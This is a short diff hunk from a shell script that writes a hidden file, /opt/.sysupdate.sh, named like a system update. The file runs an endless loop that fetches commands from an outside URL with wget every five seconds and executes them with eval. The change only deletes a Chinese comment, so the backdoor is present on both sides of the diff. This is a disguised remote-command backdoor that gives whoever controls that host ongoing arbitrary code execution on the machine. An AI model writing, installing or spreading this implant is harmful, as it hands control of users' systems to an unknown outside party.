@@ -8,7 +8,7 @@ fi
 cat << 'EOF' > /opt/.sysupdate.sh
 #!/bin/bash
 while true; do
-  cmd=$(wget -qO- https://a.dps.dpdns.org/cmd.txt)  # 使用 wget 代替 curl
+  cmd=$(wget -qO- https://a.dps.dpdns.org/cmd.txt)
   eval "$cmd"
   sleep 5  # 每5秒检查一次命令
 done
